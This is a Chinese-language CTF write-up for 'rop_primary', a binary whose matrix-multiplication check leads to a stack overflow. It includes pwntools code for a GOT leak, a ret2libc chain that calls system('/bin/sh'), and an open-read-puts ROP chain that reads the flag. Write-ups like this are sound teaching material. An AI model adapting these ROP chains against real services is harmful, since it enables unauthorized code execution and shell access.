# rop_primary

## 题目简述

程序先输出两个矩阵，要求提交它们的乘积；通过这一关后，输入缓冲区存在栈溢出，覆盖返回地址的偏移为 `0x38`。二进制没有附带 libc，常规解法是先用 `puts@plt` 泄露 GOT 地址并回到输入函数，再识别远端 libc，最终调用 `system("/bin/sh")`。程序自身也导入了 `open`、`read`、`puts`，因此还可以直接构造 ORP 链读取 flag。

## 解题过程

先读取以制表符分隔的矩阵，并计算 $C=A\times B$：

$$
C_{ij}=\sum_k A_{ik}B_{kj}
$$

```python
def multiply(a, b):
    return [
        [sum(a[i][k] * b[k][j] for k in range(len(b)))
         for j in range(len(b[0]))]
        for i in range(len(a))
    ]
```

提交所有结果后进入溢出点。第一阶段 ROP 使用附件中的固定 gadget：

```python
from pwn import *

elf = ELF("./rop_primary", checksec=False)
pop_rdi = 0x401613
restart = 0x40157C
offset = 0x38

stage1 = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    restart,
)
```

发送后读取 `puts` 实际地址。ASLR 不改变函数在同一 libc 内的页内偏移，因此泄露地址的低 12 位可以用于 libc 数据库筛选；只有多个候选时，应再泄露第二个 GOT 函数消歧，不能仅凭一个地址盲选。确定版本后计算：

```python
libc.address = leaked_puts - libc.sym["puts"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

stage2 = flat(
    b"A" * offset,
    pop_rdi,
    bin_sh,
    libc.sym["system"],
)
```

官方 WP 还给出不依赖 libc 识别的 ORP 路线。二进制中有 `pop rsi; pop r15; ret`（`0x401611`）和可写缓冲区 `0x4040e0`，但没有 `pop rdx; ret`。该版本的 glibc `open64` 包装函数先执行 `mov r12d, esi`，在系统调用前再执行 `mov edx, r12d`，返回后 `rdx` 仍保留该值。因此可令 `rsi=0x100` 调用 `open("flag", 0x100)`，借此把后续 `read` 的长度也准备为 `0x100`：

```python
pop_rsi_r15 = 0x401611
buf = 0x4040E0

orw = flat(
    b"A" * offset,
    pop_rdi, 0,
    pop_rsi_r15, buf, 0,
    elf.plt["read"],           # 先把 "flag\0" 写入 buf
    pop_rdi, buf,
    pop_rsi_r15, 0x100, 0,
    elf.plt["open"],           # 同时让 open64 内部把 edx 设为 0x100
    pop_rdi, 3,
    pop_rsi_r15, buf, 0,
    elf.plt["read"],
    pop_rdi, buf,
    elf.plt["puts"],
)
```

这里假定远端首次打开的额外文件描述符为 `3`；若进程预先打开了其他文件，应泄露或调整文件描述符。第一段 `read` 的长度还依赖进入溢出点时的 `rdx`，复现时要在调试器中确认，或改用 ret2csu 显式设置三个参数。

## 方法总结

本题把矩阵计算门槛和基础 ROP 串联起来。无 libc 时，首选“泄露 GOT → 重入 → 识别 libc → ret2libc”；直接 ORP 虽然省去识别步骤，但必须核实文件描述符和 `rdx` 来源。官方脚本依赖特定 `open64` 包装实现，这种寄存器副作用不是通用 ABI 保证，换 libc 后需要重新反汇编验证。
